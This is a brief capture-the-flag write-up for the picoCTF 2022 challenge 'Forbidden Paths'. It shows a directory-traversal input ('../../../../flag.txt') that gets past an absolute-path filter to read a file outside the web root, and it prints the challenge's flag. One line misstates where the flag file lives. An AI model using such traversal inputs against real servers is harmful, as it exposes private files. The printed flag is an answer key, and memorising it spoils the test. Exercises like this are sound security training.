#pico2022 #webexploitation 

## Challenge:
```md
Can you get the flag? Here's the [website](http://saturn.picoctf.net:49700/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
```

## Process:
Open up the [website](http://saturn.picoctf.net:49700/).
![[032_Forbidden_Paths-0.png]]

And we know the file is stored at */usr/share/nginx/html/flag.txt*. Therefore we can access the file with:
```
../../../../flag.txt
```

![[032_Forbidden_Paths-1.png]]

And clicking *read* gets us the flag.
```bash
echo "picoCTF{7h3_p47h_70_5ucc355_6db46514}" > flag.txt
```
#echo 

**Flag: *picoCTF{7h3_p47h_70_5ucc355_6db46514}***
